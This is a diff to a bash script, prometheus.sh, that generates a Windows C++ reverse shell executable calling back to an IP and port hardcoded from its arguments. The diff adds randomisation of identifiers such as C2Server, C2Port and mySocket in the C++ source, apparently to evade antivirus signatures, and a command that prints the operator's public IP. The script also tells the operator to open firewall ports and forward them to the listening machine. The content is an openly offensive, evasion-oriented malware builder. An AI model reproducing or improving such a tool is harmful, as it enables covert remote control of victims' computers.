@@ -7,16 +7,19 @@ YELLOW='\033[49;93m'
 NC='\033[0m' # No Color
 
 echo -e "${YELLOW}"
-echo -e "+----------------------------------------------------+"
-echo -e "|  Adversarial Informatics Weaponized C++ Rev Shell  |"
-echo -e "|               cygienesolutions.com                 |"
-echo -e "|        [Usage]: ./prometheus.sh <IP> <PORT>        |"
-echo -e "+----------------------------------------------------+"
+echo -e "+--------------------------------------------------+"
+echo -e "|  Adversarial Informatics High Entropy Rev Shell  |"
+echo -e "|               cygienesolutions.com               |"
+echo -e "|        [Usage]: ./prometheus.sh <IP> <PORT>      |"
+echo -e "+--------------------------------------------------+"
 echo -e "${NC}"
 if [ $# == 0 ] ; then
     echo "[*] Prometheus will generate a brand new PE with a hardcoded socket address."
     echo "[!] Don't forget to punch a hole in your FW (80,443) and PRTFWD to the local machine."
     echo -e "${GREEN}"
+    echo -e "Public IP:"
+curl ifconfig.me
+    echo -e ""
     echo -e "[Usage]: ./prometheus.sh <IP> <PORT>"
     echo -e "${NC}"
     echo ""
@@ -26,11 +29,33 @@ IP=$1
 PORT=$2
 
 echo -e "${GREEN}"
-echo -e "Building Custom Reverse Shell Executable..."
+echo -e "Building Custom High Entropy Reverse Shell Executable..."
 echo -e "${NC}"
 
 
 cp rev_shell.cpp_rsc rev_shell.cpp
+
+RANDVAL=$(cat /dev/urandom | tr -dc 'a-zA-Z' | fold -w 7 | head -n 1)
+sed -i "s/mySocket/${RANDVAL}/g" rev_shell.cpp
+
+RANDVAL=$(cat /dev/urandom | tr -dc 'A-Z' | fold -w 7 | head -n 1)
+sed -i "s/DEFAULT_BUFLEN/${RANDVAL}/g" rev_shell.cpp
+
+RANDVAL=$(cat /dev/urandom | tr -dc 'a-zA-Z' | fold -w 7 | head -n 1)
+sed -i "s/sinfo/${RANDVAL}/g" rev_shell.cpp
+
+RANDVAL=$(cat /dev/urandom | tr -dc 'a-zA-Z' | fold -w 7 | head -n 1)
+sed -i "s/RecvCode/${RANDVAL}/g" rev_shell.cpp
+
+RANDVAL=$(cat /dev/urandom | tr -dc 'a-zA-Z' | fold -w 7 | head -n 1)
+sed -i "s/version/${RANDVAL}/g" rev_shell.cpp
+
+RANDVAL=$(cat /dev/urandom | tr -dc 'a-zA-Z' | fold -w 7 | head -n 1)
+sed -i "s/C2Server/${RANDVAL}/g" rev_shell.cpp
+
+RANDVAL=$(cat /dev/urandom | tr -dc 'a-zA-Z' | fold -w 7 | head -n 1)
+sed -i "s/C2Port/${RANDVAL}/g" rev_shell.cpp
+
 echo "        char host[] = \"$IP\";" >> rev_shell.cpp
 echo "        int port = $PORT;" >> rev_shell.cpp
 echo "        RunShell(host, port);" >> rev_shell.cpp
